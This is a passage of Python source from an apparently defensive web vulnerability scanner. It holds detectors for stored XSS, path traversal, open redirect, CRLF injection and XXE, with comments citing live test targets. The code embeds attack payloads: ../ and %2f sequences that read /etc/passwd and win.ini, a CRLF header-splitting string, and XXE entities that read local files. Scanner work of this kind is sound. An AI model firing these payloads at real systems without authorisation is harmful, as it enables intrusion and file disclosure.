    differential comparison. The writability oracle false-verified six
    crypto servlets (eval_v430_final: crypto FP=6, precision 99.02%): the
    engine sends form values percent-encoded (..%2F..%2Ftmp%2Fburhan-w-N),
    ESAPI re-encodes '%' as &#x25; in the echo, and the plain
    .replace(payload) never matched — the differential measured the
    payload's OWN tmp-vs-etc text and VERIFIED a write leak that does not
    exist. Transformations neutralized, in order: HTML entities
    (entity_normalize), percent-encoding (unquote, two passes — the raw
    %-encoded payload variant is stripped as well), and the app-side
    last-char strip (the Benchmark servlets substring(0, len-1) the param
    before echoing). Idempotent on bodies that carry none of the payloads."""
    import urllib.parse as _up
    v = entity_normalize(body or "")
    for _ in range(2):
        prev = v
        v = _up.unquote(v)
        if v == prev:
            break
    for p in payloads:
        if not p:
            continue
        # Deterministic order — FULL payload (plain, then %-encoded) BEFORE
        # the last-char variant: set-iteration order once stripped
        # p[:-1] first, mangling a FULL echo and leaving its final character
        # behind as a phantom difference (live-caught on BenchmarkTest00003:
        # residual 'd' from 'passwd' -> a false exists_oracle differential).
        for x in (p, _up.quote(p, safe="")):
            v = v.replace(x, "")
        if len(p) > 1:
            short = p[:-1]          # app-side last-char strip
            for x in (short, _up.quote(short, safe="")):
                v = v.replace(x, "")
    return v


# ------------------------------------------------------------ DETECT-16 (v4.2.3): stored XSS
class _StoredFormParser(HTMLParser):
    """DETECT-16 helper: parse the forms of ONE page WITH field types — the crawl
    parser records (name, value) only, but the stored flow must distinguish hidden
    ride-along fields (ASP.NET __VIEWSTATE, rotating CSRF tokens — round-tripped
    with FRESH values; the live miss on testaspnet Comments.aspx was exactly a
    stale-viewstate 500, IV13 evidence aspnet2.json) from the mutable injection
    surface (text inputs + textareas). SUBMIT BUTTONS ARE CAPTURED TOO and ride
    along on submit — ASP.NET WebForms routes the postback event through the
    clicked button's name=value pair (btnSend=Send); dropping it makes the
    server accept the POST and silently discard the comment (live-caught on
    testaspnet /Comments.aspx: POST 200, nothing stored — the IV13 success sent
    the button; the engine's first flow did not)."""
    RIDING = {"hidden", "submit", "button", "reset", "image"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []          # [{action, method, fields: [[name, value, type]]}]
        self._cur = None
        self._sel = None         # name of an open <select> awaiting its default
        self._btn = None         # open <button> awaiting its text content

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method") or "GET").upper(), "fields": []}
        elif self._cur is not None and tag == "input" and a.get("name"):
            t = (a.get("type") or "text").lower()
            if t in ("submit", "button", "reset", "image"):
                # named buttons ride along on submit (WebForms event routing);
                # unnamed ones submit nothing and are dropped
                self._cur["fields"].append([a["name"], a.get("value", ""), "submitbutton"])
            else:
                self._cur["fields"].append([a["name"], a.get("value", ""), t])
        elif self._cur is not None and tag == "textarea" and a.get("name"):
            self._cur["fields"].append([a["name"], "", "textarea"])
        elif self._cur is not None and tag == "button" and a.get("name"):
            self._btn = [a["name"], a.get("value", ""), "submitbutton"]
            self._cur["fields"].append(self._btn)
        elif self._cur is not None and tag == "select" and a.get("name"):
            self._sel = a["name"]
            self._cur["fields"].append([a["name"], "", "select"])
        elif self._sel is not None and tag == "option":
            for f in self._cur["fields"]:
                if f[0] == self._sel and f[2] == "select" and f[1] == "":
                    f[1] = a.get("value", "") or ""   # first option = browser default

    def handle_data(self, data):
        # <button>text</button>: browsers submit the TEXT when the value attr is absent
        if self._btn is not None and not self._btn[1]:
            self._btn[1] = (self._btn[1] or "") + data.strip()

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None
        elif tag == "select":
            self._sel = None
        elif tag == "button":
            self._btn = None


def _get_endpoint_for(url: str, method: str = "GET", params: list | None = None) -> Endpoint:
    """Build an Endpoint that PRESERVES the URL's query string — the request engine
    serializes the query from ep.parameters and silently drops a query embedded in
    the raw URL (base + rebuilt-query in _render; same lesson as discovery DISC-06
    for form actions). Every stored-flow GET/POST (origin fetch, submit, render
    surfaces) and the path-traversal probes go through here."""
    s = urllib.parse.urlsplit(url)
    base = urllib.parse.urlunsplit((s.scheme, s.netloc, s.path, "", ""))
    qfields = urllib.parse.parse_qsl(s.query, keep_blank_values=True)
    plist = [Parameter(n, ParamLocation.QUERY, v) for n, v in qfields]
    for p in (params or []):
        plist.append(p)
    return Endpoint(url=base, method=method, parameters=plist)


def fresh_form(engine, origin_url: str, ep: Endpoint):
    """DETECT-16 helper: fetch the form's origin page FRESH and return the parsed
    form matching the endpoint's action path + method. Returns (origin_resp, form)
    with form=None when no match. Used standalone by the detector to pre-filter
    render-capable target fields (passwords are hashed server-side, hidden fields
    are ride-along state — neither is ever a stored-render surface), and inside
    stored_xss_flow where each submit gets its own fresh round-trip (rotating
    __VIEWSTATE / one-shot CSRF tokens stay valid)."""
    origin_resp = engine.send(RequestMutation(endpoint=_get_endpoint_for(origin_url),
                                              note="stored-xss-fresh-form"))
    if origin_resp is None or origin_resp.error or not origin_resp.body:
        return origin_resp, None
    fp = _StoredFormParser()
    try:
        fp.feed(origin_resp.body)
    except Exception:
        return origin_resp, None
    want_path = urllib.parse.urlsplit(ep.url).path
    want_method = (ep.method or "GET").upper()
    for f in fp.forms:
        action_abs = urllib.parse.urljoin(origin_url, f["action"] or origin_url)
        if (urllib.parse.urlsplit(action_abs).path == want_path
                and (f["method"] or "GET").upper() == want_method):
            f["_action_abs"] = action_abs
            return origin_resp, f
    return origin_resp, None


def stored_xss_flow(engine, ep: Endpoint, param: str, canary: str,
                    origin_url: str, surfaces: list | None = None):
    """DETECT-16 (v4.2.3) shared flow — detector AND verifier call this (verification
    = full re-execution with a FRESH canary, never a replay of the detection request).
      1. re-fetch the form's origin page FRESH and parse its fields (rotating
         __VIEWSTATE / CSRF tokens must round-trip with fresh values);
      2. submit the form with the canary in the target mutable field — hidden fields
         ride verbatim, sibling fields keep the page's own defaults (honest form
         replay: a browser submits exactly what the page carries);
      3. fetch the render surfaces — the form action URL (its own page: where a
         posted comment renders), the form's origin page, and the action's parent
         directory (the app-home pattern: gruyere renders the signup uid in the
         menu of every page under /<instance>/). The SUBMIT response itself is
         deliberately NOT a surface: a canary echoed there is a REFLECTION and
         belongs to the reflected detector, not to the stored class;
      4. persistence control: a raw hit must survive an INDEPENDENT second fetch —
         a transient echo is reflection, only a surviving marker is storage.
    Returns (origin_resp, submit_resp, hits) with hits = [(url, resp1, resp2), ...]."""
    # 1) fresh form page
    origin_resp, form = fresh_form(engine, origin_url, ep)
    if form is None:
        return origin_resp, None, []
    # the target field must be a RENDER-capable input: passwords are hashed
    # server-side (never rendered back), hidden fields are ride-along state
    # (mutating them only breaks the flow — the __VIEWSTATE 500 lesson).
    tgt_type = next((ft for n, _v, ft in form["fields"] if n == param), None)
    if tgt_type in ("password", "hidden"):
        return origin_resp, None, []
    # 2) build the submit with the canary in the target field — the browser's
    # POST shape: every form field rides along, hidden fields with FRESH page
    # values, the FIRST named submit button clicked (WebForms event routing),
    # sibling mutables with the page's own defaults.
    fields, target_seen, btn_done = [], False, False
    for name, value, ftype in form["fields"]:
        if name == param:
            fields.append((name, canary))
            target_seen = True
        elif ftype == "submitbutton":
            if not btn_done:
                fields.append((name, value))   # click the primary button
                btn_done = True
        else:
            fields.append((name, value))
    if not target_seen:
        return origin_resp, None, []
    action_abs = form["_action_abs"]
    form_method = (form.get("method") or "GET").upper()
    if form_method == "GET":
        # the form's OWN action query rides along; same-named form fields override it
        sub = urllib.parse.urlsplit(action_abs)
        qfields = dict(urllib.parse.parse_qsl(sub.query, keep_blank_values=True))
        for n, v in fields:
            qfields[n] = v
        submit_ep = _get_endpoint_for(action_abs, method="GET",
                                      params=[Parameter(n, ParamLocation.QUERY, v)
                                              for n, v in qfields.items()])
        submit_resp = engine.send(RequestMutation(endpoint=submit_ep, note="stored-xss-submit"))
    else:
        # POST: the action's own query (?id=0 on ASP.NET forms) rides in the URL,
        # the form fields ride in the body; Referer = the form's page (browsers
        # always send it; some servers enforce it on state-changing POSTs)
        submit_ep = _get_endpoint_for(action_abs, method="POST")
        submit_resp = engine.send(RequestMutation(endpoint=submit_ep, note="stored-xss-submit",
                                                  body_override=urllib.parse.urlencode(fields),
                                                  extra_headers={"Referer": origin_url}))
    if submit_resp is None or submit_resp.error:
        return origin_resp, submit_resp, []
    # 3) render surfaces (deterministic order, deduped)
    if surfaces is None:
        parent = action_abs.rsplit("/", 1)[0] + "/"
        surfaces = [action_abs, origin_url, parent]
    seen, uniq = set(), []
    for s in surfaces:
        if s not in seen:
            seen.add(s)
            uniq.append(s)
    hits = []
    for s_url in uniq:
        r1 = engine.send(RequestMutation(endpoint=_get_endpoint_for(s_url), note="stored-xss-render"))
        if r1 is None or r1.error or canary not in (r1.body or ""):
            continue
        # 4) persistence control: independent second fetch must still carry it raw
        r2 = engine.send(RequestMutation(endpoint=_get_endpoint_for(s_url), note="stored-xss-render-persist"))
        if r2 is not None and not r2.error and canary in (r2.body or ""):
            hits.append((s_url, r1, r2))
    return origin_resp, submit_resp, hits


class StoredXSSDetector(Detector):
    """DETECT-16 (v4.2.3, two live-caught gaps from the IV13 independent round,
    2026-10-03): the engine was REFLECTED-only — a canary that renders only on a
    LATER request was structurally invisible.
      Gap A — testaspnet.vulnweb.com /Comments.aspx `tbComment`: <u> marker posted
      via the real form (full __VIEWSTATE round-trip) renders raw on reload
      (iv13_evidence/aspnet2.json: post 200 -> reload 200, raw markup).
      Gap B — google-gruyere.appspot.com /saveprofile `uid`: GET-form signup, the
      GRUYERE cookie carries the raw uid and the home menu-user span renders it
      raw (iv13_evidence/gruyere_probes.json: stored_markup_raw true).
    Both reduce to the shared flow above. Gated to CONTENT-SUBMISSION forms
    (comment/profile/signup/register/...): search, login and commerce forms never
    store attacker content and probing them is budget spent for nothing — this
    gate also means ZERO shared-fixture forms match (bench: zero new requests,
    zero verdict changes; the new coverage is proven by the dedicated unit
    mini-apps and the frozen-build mechanism probes instead)."""
    name, vuln_type = "xss_stored", "xss_stored"
    severity = Severity.HIGH
    CONTENT_WORDS = ("comment", "reply", "review", "profile", "signup", "sign-up",
                     "register", "guestbook", "feedback", "message", "board",
                     "thread", "news", "bio", "nickname", "signature", "uid",
                     "username", "save", "update", "edit")
    # canaries are per-param (<burhanst0>, <burhanst1>) — see run()
    MAX_PARAMS_PER_FORM = 2

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _content_form(self, ep: Endpoint) -> bool:
        path = urllib.parse.urlsplit(ep.url).path.lower()
        segments = [s for s in path.split("/") if s]
        params = [p.name.lower() for p in ep.parameters]
        return any(w in t for t in segments + params for w in self.CONTENT_WORDS)

    @staticmethod
    def _origin_of(ep: Endpoint) -> str:
        for t in (ep.tags or []):
            if t.startswith("form_origin:"):
                return t.split(":", 1)[1]
        return ep.url        # fallback: self-referencing form (action == page)

    def run(self, ep: Endpoint) -> list:
        if ep.source != DiscoverySource.CRAWL_FORM:   # str-Enum: value comparison
            return []
        if "divform" in (ep.tags or []):
            return []                              # JS-built pseudo-forms: out of scope here
        if (ep.method or "GET").upper() not in ("GET", "POST"):
            return []
        if not self._content_form(ep):
            return []
        origin_url = self._origin_of(ep)
        # pre-filter: ONE fresh parse tells which endpoint params are render-capable
        # mutable fields on the live form — hidden ride-alongs (__VIEWSTATE et al.)
        # and passwords are skipped BEFORE any submit is spent on them.
        _o, form = fresh_form(self.engine, origin_url, ep)
        if form is None:
            return []
        mutable = {n for n, _v, ft in form["fields"]
                   if ft not in ("hidden", "password", "submitbutton")}
        findings, budget, probed = [], self.MAX_PARAMS_PER_FORM, 0
        for p in ep.parameters:
            if budget <= 0:
                break
            if p.kind == ParamKind.TOKEN or p.name not in mutable:
                continue
            # unique canary per probed param: once one param's marker is stored,
            # every later render of the surface carries it — a second param probed
            # with the SAME marker would inherit the first probe's hit (false
            # attribution, caught by the unit test's tbName control).
            canary = f"<burhanst{probed}>"
            probed += 1
            _o, _s, hits = stored_xss_flow(self.engine, ep, p.name, canary, origin_url)
            if not hits:
                continue
            s_url, r1, r2 = hits[0]
            i = (r1.body or "").find(canary)
            ctx = (r1.body or "")[max(0, i - 60):i + 80].replace("\n", " ")
            all_surfaces = " | ".join(u for u, _a, _b in hits)
            findings.append(Finding(
                "xss_stored", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("stored_xss_reflection",
                          f"canary markup submitted via the real form persisted server-side and "
                          f"rendered RAW on {s_url} — survived an independent re-fetch "
                          f"(transient echoes are reflections, not storage)",
                          r1.request_id, ctx),
                 Evidence("stored_xss_surfaces",
                          "render surfaces: " + all_surfaces,
                          r2.request_id, "")],
                status=FindingStatus.CANDIDATE))
            budget -= 1
        return findings


# ------------------------------------------------------------ PT-2 (v4.3.4): header-NAME traversal
class HeaderNameTraversalDetector(Detector):
    """PT-2 (recall push, live-caught on the OWASP Benchmark round-6 eval):
    14/82 pathtraver FNs read the sink path from the NAME of the first
    non-standard HTTP header (getHeaderNames() loop — the Benchmark's
    header-name channel). No param mutation can ever reach that channel.
    Live-proven oracle: a valid-token header NAME that resolves INSIDE the
    sink's base ('..' — the base's parent directory, which must exist) vs a
    burhan-random control name (which must not) answers the exists-boolean
    differently ('And file already exists.' vs "But file doesn't exist yet.")
    — while Tomcat rejects '/' inside header NAMES with a 400 (live-proven),
    so the honest depth of this battery is the one-level escape and the
    finding says exactly that. Echo safety (the GTP-08b lesson — 62 FPs from
    a bare marker differential): BOTH names AND the bare '..' token are
    neutralized from BOTH bodies before comparison — a name-echoing debug
    page reduces to identical text and stays silent. Cost: 2 requests per
    endpoint."""
    name, vuln_type = "trav_hname", "path_traversal"
    severity = Severity.HIGH
    PROBE_NAME = ".."          # valid RFC 7230 token; parent of the sink base
    PROBE_VALUE = "1"          # constant value both sides (echoes symmetric)
    MAX_ENDPOINTS = 4096

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._done >= self.MAX_ENDPOINTS or command_shaped_endpoint(ep):
            return None
        self._done += 1
        import random as _r
        # PT-2 live-caught defect (own bug, caught by instrumented scan on
        # BenchmarkTest00215): the engine renders the endpoint's HEADER-location
        # params as request headers on EVERY mutation — the spec's decoy header
        # param ('whatever') arrived BEFORE our probe header, the servlet's
        # first-non-standard-name loop took THE DECOY's name, and probe vs
        # control were byte-identical (155B/155B — silent). The probes must ride
        # a PARAM-BARE copy of the endpoint: the header-NAME channel is being
        # tested, so no declared param may ride along.
        ep_bare = Endpoint(url=ep.url, method=ep.method)
        ctrl = f"burhan-hn-{_r.randrange(1000, 99999)}"
        r1 = self.engine.send(RequestMutation(endpoint=ep_bare, note="trav-hname-probe",
                                              extra_headers={self.PROBE_NAME: self.PROBE_VALUE}))
        r2 = self.engine.send(RequestMutation(endpoint=ep_bare, note="trav-hname-control",
                                              extra_headers={ctrl: self.PROBE_VALUE}))
        if r1 is None or r2 is None or r1.error or r2.error or not r1.status or not r2.status:
            return None
        # symmetric neutralization: strip the echoed control name from the
        # control body, and the '..' token from BOTH bodies (natural '..'
        # occurrences then vanish on both sides — no phantom differential)
        b1 = echo_neutralize(r1.body or "", self.PROBE_NAME)
        b2 = echo_neutralize(r2.body or "", ctrl, self.PROBE_NAME)
        if r1.status != r2.status or b1 != b2:
            # PT-D1/PT-D2 (Juice Shop 20.3.0 independent-verification round,
            # 2026-10-31 — 7 live false positives, both root-caused):
            # PT-D2 an input-CRASH differential (exactly one side 5xx) is NOT
            #   a file-existence oracle — live: /api/Products?..=1 -> 500
            #   'Cannot read properties of undefined' vs control 200; the ORM
            #   chokes on the odd param name, no file path is ever built.
            #   The exists-oracle lives INSIDE one response class (both 2xx
            #   or both 4xx) — one-side-5xx disqualifies the interpretation.
            # PT-D1 a NON-DETERMINISTIC endpoint differentiates against
            #   itself — live: /rest/captcha returns a fresh captcha every
            #   request, so probe-vs-control measured pure noise. A second
            #   control sample (only sent when a differential is about to
            #   fire — +1 request per firing candidate, never per endpoint)
            #   must agree with the first, or the oracle is noise.
            if (r1.status >= 500) != (r2.status >= 500):
                return None
            ctrl2 = f"burhan-hn-{_r.randrange(1000, 99999)}"
            r3 = self.engine.send(RequestMutation(endpoint=ep_bare,
                                                  note="trav-hname-determinism",
                                                  extra_headers={ctrl2: self.PROBE_VALUE}))
            if r3 is None or r3.error or not r3.status:
                return None
            b3 = echo_neutralize(r3.body or "", ctrl2, self.PROBE_NAME)
            if r3.status != r2.status or b3 != b2:
                return None          # the endpoint varies on its own — noise
            return Finding("path_traversal", Severity.HIGH, ep.url,
                           f"header:{self.PROBE_NAME}", ep.method,
                           [Evidence("header_name_oracle",
                                     f"header-NAME file-existence differential: custom header named "
                                     f"'{self.PROBE_NAME}' (the sink base's parent — must exist) vs "
                                     f"'{ctrl}' (burhan-random — must not) answered differently "
                                     f"beyond the echoed names (HTTP {r1.status} "
                                     f"{len(r1.body or '')}B vs HTTP {r2.status} "
                                     f"{len(r2.body or '')}B) — the sink builds a file path from "
                                     f"the header NAME and leaks file existence one level outside "
                                     f"its base (header names cannot carry '/', so the provable "
                                     f"escape depth is one level)", r1.request_id)],
                           status=FindingStatus.CANDIDATE, detector="trav_hname")
        return None


# ------------------------------------------------------------ PT-3 (v4.3.5): param-NAME traversal
class ParamNameTraversalDetector(Detector):
    """PT-3 (recall push, live-caught on the OWASP Benchmark round-6 eval):
    13/82 pathtraver FNs read the sink path from the NAME of a request
    parameter — either the first parameter NAME (getParameterNames loop) or,
    in the value-matching shape, the name of the param whose VALUE equals the
    endpoint's own basename (live-proven on BenchmarkTest00525: the loop hunts
    a value == 'BenchmarkTest00525' and takes that param's NAME as the path).
    Probes: a param NAMED '..' (valid, the sink base's parent — must exist)
    with VALUE = the endpoint basename, vs a burhan-random control name with
    the same value. Live-proven differentials across three sink shapes:
    exists-boolean flip (00525/00528/01403: 'And file already exists.' vs
    "But file doesn't exist yet."), stream-error text (02303: '(Is a
    directory)' vs '(No such file or directory)'), and empty-vs-echo (01408:
    FileOutputStream on a directory swallows to 0B while a creatable target
    echoes 133B). Echo safety: '..' stripped from BOTH bodies, the control
    name from the control body (symmetric — the GTP-08b lesson). Probes ride
    a PARAM-BARE endpoint copy (the PT-2 lesson: declared params render on
    every mutation and would steal the channel). Cost: 2 requests/endpoint."""
    name, vuln_type = "trav_pname", "path_traversal"
    severity = Severity.HIGH
    PROBE_NAME = ".."
    MAX_ENDPOINTS = 4096

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._done = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._done >= self.MAX_ENDPOINTS or command_shaped_endpoint(ep):
            return None
        self._done += 1
        import random as _r
        from urllib.parse import urlsplit
        base = urlsplit(ep.url).path.rstrip("/").rsplit("/", 1)[-1]
        if not base:
            return None
        ep_bare = Endpoint(url=ep.url, method=ep.method)
        ctrl = f"burhan-pn-{_r.randrange(1000, 99999)}"
        r1 = self.engine.send(RequestMutation(endpoint=ep_bare, param_name=self.PROBE_NAME,
                                              param_value=base, note="trav-pname-probe"))
        r2 = self.engine.send(RequestMutation(endpoint=ep_bare, param_name=ctrl,
                                              param_value=base, note="trav-pname-control"))
        if r1 is None or r2 is None or r1.error or r2.error or not r1.status or not r2.status:
            return None
        b1 = echo_neutralize(r1.body or "", self.PROBE_NAME)
        b2 = echo_neutralize(r2.body or "", ctrl, self.PROBE_NAME)
        if r1.status != r2.status or b1 != b2:
            # PT-D1/PT-D2 (Juice Shop 20.3.0 independent-verification round,
            # 2026-10-31 — 7 live false positives, both root-caused; see the
            # trav_hname gate for the full live evidence). PT-D2: a one-side-5xx
            # input-crash differential is not a file-existence oracle (the ORM
            # chokes on the odd param NAME — /api/Products?..=1 -> 500). PT-D1:
            # a second control sample must agree with the first or the endpoint
            # is non-deterministic and the differential was noise (/rest/captcha).
            if (r1.status >= 500) != (r2.status >= 500):
                return None
            ctrl2 = f"burhan-pn-{_r.randrange(1000, 99999)}"
            r3 = self.engine.send(RequestMutation(endpoint=ep_bare, param_name=ctrl2,
                                                  param_value=base,
                                                  note="trav-pname-determinism"))
            if r3 is None or r3.error or not r3.status:
                return None
            b3 = echo_neutralize(r3.body or "", ctrl2, self.PROBE_NAME)
            if r3.status != r2.status or b3 != b2:
                return None          # the endpoint varies on its own — noise
            return Finding("path_traversal", Severity.HIGH, ep.url,
                           f"param-name:{self.PROBE_NAME}", ep.method,
                           [Evidence("param_name_oracle",
                                     f"param-NAME file oracle differential: a parameter NAMED "
                                     f"'{self.PROBE_NAME}' (the sink base's parent — must exist) "
                                     f"vs '{ctrl}' (burhan-random — must not), both carrying the "
                                     f"endpoint-basename value, answered differently beyond the "
                                     f"echoed names (HTTP {r1.status} {len(r1.body or '')}B vs "
                                     f"HTTP {r2.status} {len(r2.body or '')}B) — the sink builds a "
                                     f"file path from the parameter NAME (exists-boolean flip, "
                                     f"stream-error text, or empty-vs-echo) and leaks file state "
                                     f"one level outside its base", r1.request_id)],
                           status=FindingStatus.CANDIDATE, detector="trav_pname")
        return None


# ------------------------------------------------------------ DETECT-17 (v4.2.3): traversal in the URL path
class PathTraversalDetector(Detector):
    """DETECT-17 (v4.2.3, live-caught gap from the IV13 independent round):
    traversal IN THE URL PATH was never probed — the battery was param-bound only.
    google-gruyere.appspot.com serves /<inst>/..%2f..%2f..%2f..%2fetc%2fpasswd
    -> 200, 246 B of real /etc/passwd content (iv13_evidence/gruyere_probes.json
    trav-4up-passwd; the ..%2f URL-encoded shape survives front-line path
    normalization because the server decodes %2f AFTER it — the plain ../ and
    2-up shapes fail on that stack). The battery carries encoded and plain
    shapes at three depths from each probe base. Runs once per scan from the
    target root + the crawled directory prefixes (see orchestrator), NOT per
    endpoint."""
    name, vuln_type = "trav_path", "path_traversal"
    severity = Severity.HIGH
    PAYLOADS = ["..%2f" * 4 + "etc%2fpasswd",
                "..%2f" * 2 + "etc%2fpasswd",
                "..%2f" * 6 + "etc%2fpasswd",
                "..%2f" * 4 + "windows%2fwin.ini",
                "../" * 4 + "etc/passwd"]

    def candidates(self, ep: Endpoint):          # not used — see run_base(base)
        return []

    def run_base(self, base: str) -> list:
        findings = []
        for pl in self.PAYLOADS:
            url = base.rstrip("/") + "/" + pl
            r = self.engine.send(RequestMutation(endpoint=_get_endpoint_for(url),
                                                 note="path-traversal-probe"))
            if r is None or r.error or not r.body:
                continue
            for marker, fname in TraversalDetector.MARKERS:
                if marker in r.body:
                    i = r.body.find(marker)
                    findings.append(Finding(
                        "path_traversal", Severity.HIGH, url, "", "GET",
                        [Evidence("path_file_marker",
                                  f"content of {fname} leaked via URL-PATH traversal "
                                  f"(marker {marker!r} at offset {i})",
                                  r.request_id, r.body[i:i + 200])],
                        status=FindingStatus.CANDIDATE))
                    break
            if findings:
                break               # depth ladder stops at the first hit per base
        return findings


class RedirectDetector(Detector):
    name, vuln_type = "redirect", "open_redirect"
    severity = Severity.MEDIUM
    PROBE_HOST = "burhan-redirect-check.example.org"
    # iv14 @ 23c4619 (branch iv14/session-round-v423-gap-closure, the v4.2.3
    # gap-closure round, transferred to main per supervisor order 2026-10-12,
    # fix + its distinctive test only): CLIENT_REDIRECT_SINK_RE — the
    # sink-CONTEXT contract. The probe host must sit INSIDE the redirect
    # expression itself (JS assignment / http.refresh call / meta-refresh
    # content carrying the URL). The old OWSP-29 criterion — ANY sink keyword
    # within a 200-char window of a raw reflection — was the structural
    # open_redirect FP live-caught on testaspnet tbComment during IV14: the
    # value rode a div reflection while an unrelated window.location sat
    # ~35 chars away (inside the window), and the detector fired
    # open_redirect on a page that never redirects with the value.
    CLIENT_REDIRECT_SINK_RE = re.compile(
        r"(?:location\.href|window\.location)\s*=\s*[\"']?\s*(?:https?:)?//" + re.escape(PROBE_HOST)
        + r"|http\.refresh\s*\(\s*[\"']?\s*(?:https?:)?//" + re.escape(PROBE_HOST)
        + r"|meta[^>]{0,120}?refresh[^>]{0,240}?(?:https?:)?//" + re.escape(PROBE_HOST),
        re.I)

    def candidates(self, ep: Endpoint):
        ev = "burhan-redirect-check.example.org"
        return [(v, RequestMutation(endpoint=ep, param_name=p.name, param_value=v))
                for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control
                for v in (f"https://{ev}/probe", f"//{ev}/probe")]

    def _sink_expression(self, body: str) -> str:
        """iv14 @ 23c4619: the probe host must sit INSIDE a client redirect
        sink expression. A sink keyword merely NEAR a raw reflection (the old
        OWSP-29 200-char window) no longer counts — that proximity produced
        the structural FP live-caught on testaspnet tbComment (IV14).
        Returns the matched expression (evidence context) or ''."""
        m = self.CLIENT_REDIRECT_SINK_RE.search(body)
        return m.group(0) if m else ""

    def _fetch_proxy_note(self, ep: Endpoint, probed_name: str) -> str:
        """OWSP-29: an endpoint carrying a sibling param whose base value is an
        OFF-TARGET absolute URL is a fetch-proxy shape — the response body may
        be third-party content the app fetched and served, in which case a
        sink found there belongs to the REMOTE page, not the app's template."""
        thost = (urllib.parse.urlsplit(ep.url).netloc or "").lower()
        for p in ep.parameters:
            if p.name == probed_name or p.kind == ParamKind.TOKEN:
                continue
            v = (p.value or "").lower()
            if v.startswith(("http://", "https://", "//")):
                ph = urllib.parse.urlsplit(v if v.startswith("//") else v).netloc
                if ph and ph != thost:
                    return (f" [attribution: sibling param '{p.name}' carries an off-target "
                            f"URL base ({v[:60]}) — this body may be server-side-fetched "
                            "third-party content; the sink may belong to the remote page]")
        return ""

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None: return None
        loc = resp.hop_location()   # ENG-01: chain-aware (same-host followed redirects included)
        if loc and "burhan-redirect-check.example.org" in loc:
            return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("header_value", f"Location redirects off-site to {loc[:100]}", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        # reflected/meta/JS redirect context — iv14 @ 23c4619: sink-CONTEXT
        # (the probe host INSIDE the redirect expression), replacing the
        # OWSP-29 proximity window that fired the structural FP on raw
        # reflections with an unrelated sink nearby.
        if resp.body and "burhan-redirect-check.example.org" in resp.body:
            sx = self._sink_expression(resp.body)
            if sx:
                return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("body_redirect",
                                     "off-site host inside a client redirect sink expression" +
                                     self._fetch_proxy_note(ep, p.name) +
                                     f" [ctx: …{sx[:180]}…]", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        return None


class CrlfDetector(Detector):
    """DETECT-07 (live-caught on ginandjuice.shop /catalog?category=): response header
    injection. The category value flows into `Set-Cookie: category=<value>` WITHOUT
    CRLF sanitization — %0d%0a in the param splits a second attacker-controlled header
    (verified live: x-burhan-probe appeared in real response headers). Detection:
    inject a CRLF + uniquely-named probe header; if the server emits it, header
    injection is proven. Enables cookie injection, CSP/Cache-Control override, session
    fixation. Numeric params are skipped (never header-reflected in practice)."""
    name, vuln_type = "crlf", "http_response_header_injection"
    severity = Severity.HIGH
    PROBE_VALUE = "burhancrlf\r\nX-Burhan-Probe: injected"
    PROBE_HEADER = "x-burhan-probe"

    def candidates(self, ep: Endpoint):
        return [RequestMutation(endpoint=ep, param_name=p.name, param_value=self.PROBE_VALUE)
                for p in ep.parameters if p.kind not in (ParamKind.NUMERIC, ParamKind.TOKEN) and not p.flow_control]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.headers: return None
        v = resp.headers.get(self.PROBE_HEADER, "")
        if v:
            return Finding("http_response_header_injection", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("header_value",
                          f"CRLF in param split a second response header: {self.PROBE_HEADER}: {v[:80]!r} "
                          f"(attacker-controlled header injection)", resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class XxeDetector(Detector):
    """DETECT-08 (live-caught on ginandjuice.shop /catalog/product/stock): XML external
    entity injection on endpoints whose REAL request shape is built by JavaScript
    (form data is wrapped into <stockCheck> XML with Content-Type application/xml —
    xmlStockCheckPayload.js). DISC-06 learns the XML root from that JS statically; this
    detector then replays the transformation with external entities. No browser needed.

    Live-proven oracle: entity-resolved file content changes the response body
    (/etc/hostname -> 648, /etc/passwd -> 295, nonexistent -> 23); unreadable files
    (/etc/shadow) equal the nonexistent control — true file-read semantics.

    BLIND-XXE LIMIT (live-proven on ginandjuice.shop itself): when the response is
    independent of entity content (random stock numbers per request — same file gave
    23/768/52/191/52 across five probes), NO response-based oracle exists. The double-
    control stability check (control probed twice, must match) rejects such noise at
    detection time; blind XXE needs OOB/Collaborator confirmation (documented future
    phase — parameter entities are blocked there, so even error-based tricks fail).

    Two-phase probe: recon XML (form params only) reveals expected-but-missing
    elements from the app's own error text ("Store ID could not be parsed" -> storeId);
    then a 4-probe differential (control x2 vs /etc/hostname vs /etc/passwd)."""
    name, vuln_type = "xxe", "xxe"
    severity = Severity.CRITICAL
    ENTITY = "burhanxxe"
    FILES = ["file:///etc/hostname", "file:///etc/passwd"]
    CONTROL = "file:///nonexistent-burhan-control"

    def _xml(self, root, fields: list, entity_file=None, entity_target=None):
        ents = (f'<!DOCTYPE {root} [<!ENTITY {self.ENTITY} SYSTEM "{entity_file}">]>'
                if entity_file else "")
        body = "".join(f"<{k}>{v}</{k}>" for k, v in fields)
        if entity_target is not None:
            body += f"<{entity_target}>&{self.ENTITY};</{entity_target}>"
        return f'<?xml version="1.0" encoding="UTF-8"?>{ents}<{root}>{body}</{root}>'

    def _mutation(self, ep, xml):
        return RequestMutation(endpoint=ep, body_override=xml, method="POST",
                               extra_headers={"Content-Type": "application/xml"})

